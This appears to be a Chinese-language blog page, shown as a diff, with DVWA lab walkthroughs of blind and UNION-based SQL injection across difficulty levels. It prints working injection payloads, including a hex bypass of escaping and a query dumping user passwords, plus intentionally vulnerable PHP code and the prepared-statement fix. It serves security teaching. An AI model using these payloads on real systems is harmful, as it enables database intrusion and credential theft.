+<h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
+<p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=1 # 显示不存在</p>
+<p>…</p>
+<p>1’ and (select count(column_name)from information_schema.columns where table_name=’users’)=8 # 显示存在</p>
+<p>说明users表有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p>
+<p>…</p>
+<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=7 # 显示存在</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/31.PNG" alt=""></p>
+<p>说明users表的第一个字段为7个字符长度。</p>
+<h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<p>还可以使用<strong>基于时间的盲注</strong>：</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1’ and sleep(5) #，感觉到明显延迟；</p>
+<p>输入1 and sleep(5) #，没有延迟；</p>
+<p>说明存在字符型的基于时间的盲注。</p>
+<h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>首先猜解数据名的长度：</p>
+<p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</p>
+<p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
+<p>…</p>
+<p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p>
+<p>说明数据库名的第一个字符为小写字母d。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出数据库名。</p>
+<h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</p>
+<p>说明数据库中有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p>
+<p>说明第一个表名的长度为9个字符。</p>
+<p>采用二分法即可猜解出表名。</p>
+<h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p>
+<p>…</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</p>
+<p>说明users表中有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</p>
+<p>说明users表的第一个字段长度为7个字符。</p>
+<p>采用二分法即可猜解出各个字段名。</p>
+<h3 id="5-猜解数据-1"><a href="#5-猜解数据-1" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ]; </span><br><span class="line">    $id &#x3D; mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+<p>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
+<p>如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/32.PNG" alt=""></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p>
+<p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p>
+<p>首先是<strong>基于布尔的盲注</strong>：</p>
+<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
+<p>然后是<strong>基于时间的盲注</strong>：</p>
+<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_COOKIE[ &#39;id&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_COOKIE[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Might sleep a random amount </span><br><span class="line">        if( rand( 0, 5 ) &#x3D;&#x3D; 3 ) &#123; </span><br><span class="line">            sleep( rand( 2, 4 ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示<strong>基于布尔的盲注</strong>：</p>
+<p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered? </span><br><span class="line">    if(is_numeric( $id )) &#123; </span><br><span class="line">        &#x2F;&#x2F; Check the database </span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; ); </span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Get results </span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123; </span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">            header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/09/SQL%20Injection(Blind)/" data-id="ck56chf940001fcvogprlge6g"
+        class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-SQL Injection" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/01/09/SQL%20Injection/"
+    >SQL Injection</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/09/SQL%20Injection/" class="article-date">
+  <time datetime="2020-01-09T01:56:06.972Z" itemprop="datePublished">2020-01-09</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>2.猜解SQL查询语句中的字段数</p>
+<p>3.确定显示的字段顺序</p>
+<p>4.获取当前数据库</p>
+<p>5.获取数据库中的表</p>
+<p>6.获取表中的字段名</p>
+<p>7.下载数据</p>
+<p>下面对四种级别的代码进行分析。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_REQUEST[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; mysql_numrows( $result ); </span><br><span class="line">    $i   &#x3D; 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Get values </span><br><span class="line">        $first &#x3D; mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  &#x3D; mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/1.PNG" alt=""></p>
+<p>输入1’ and ‘1’ =’2,查询失败，返回结果为空：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/2.PNG" alt=""></p>
+<p>输入1’ or ‘1234 ‘=’1234,查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/3.PNG" alt=""></p>
+<p>返回多个结果，说明存在字符型注入。</p>
+<h3 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h3><p>输入1’ or 1=1 order by 1 #,查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/4.PNG" alt=""></p>
+<p>输入1’ or 1=1 order by 2 #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/5.PNG" alt=""></p>
+<p>输入1’ or 1=1 order by 3 #，查询失败：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/6.PNG" alt=""></p>
+<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<p>（这里也可以通过输入union select 1,2,3…来猜解字段数）</p>
+<h2 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h2><p>输入1’ union select 1,2 #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/7.PNG" alt=""></p>
+<h3 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h3><p>输入1’ union select 1,database() #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/8.PNG" alt=""></p>
+<p>说明当前的数据库为dvwa。</p>
+<h3 id="5-获取数据库的表"><a href="#5-获取数据库的表" class="headerlink" title="5.获取数据库的表"></a>5.获取数据库的表</h3><p>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/9.PNG" alt=""></p>
+<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
+<h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><p>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/10.PNG" alt=""></p>
+<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
+<h3 id="7-下载数据"><a href="#7-下载数据" class="headerlink" title="7.下载数据"></a>7.下载数据</h3><p>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/11.PNG" alt=""></p>
+<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ]; </span><br><span class="line">    $id &#x3D; mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; mysql_numrows( $result ); </span><br><span class="line">    $i   &#x3D; 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Display values </span><br><span class="line">        $first &#x3D; mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  &#x3D; mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+<p>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/12.PNG" alt=""></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>抓包更改参数id为1 or 1=1 #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/13.PNG" alt=""></p>
+<p>说明存在数字型注入。</p>
+<p>（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）</p>
+<h3 id="2-猜解SQL查询语句中的字段数-1"><a href="#2-猜解SQL查询语句中的字段数-1" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h3><p>抓包更改参数id为1 order by 2 #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/14.PNG" alt=""></p>
+<p>抓包更改参数id为1 order by 3 #，报错如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/15.PNG" alt=""></p>
+<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<h3 id="3-确定显示的字段顺序-1"><a href="#3-确定显示的字段顺序-1" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h3><p>抓包更改参数id为1 union select 1,2 #，查询成功：</p>
+<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/16.PNG" alt=""></p>
+<p>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p>
+<h3 id="4-获取当前数据库-1"><a href="#4-获取当前数据库-1" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h3><p>抓包更改参数id为1 union select 1,database() #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/17.PNG" alt=""></p>
+<p>说明当前的数据库为dvwa。</p>
+<h3 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h3><p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/18.PNG" alt=""></p>
+<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
+<h3 id="6-获取表中的字段名-1"><a href="#6-获取表中的字段名-1" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#，查询失败：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/19.PNG" alt=""></p>
+<p>这是因为单引号被转义了，变成了\’。</p>
+<p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p>
+<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/20.PNG" alt=""></p>
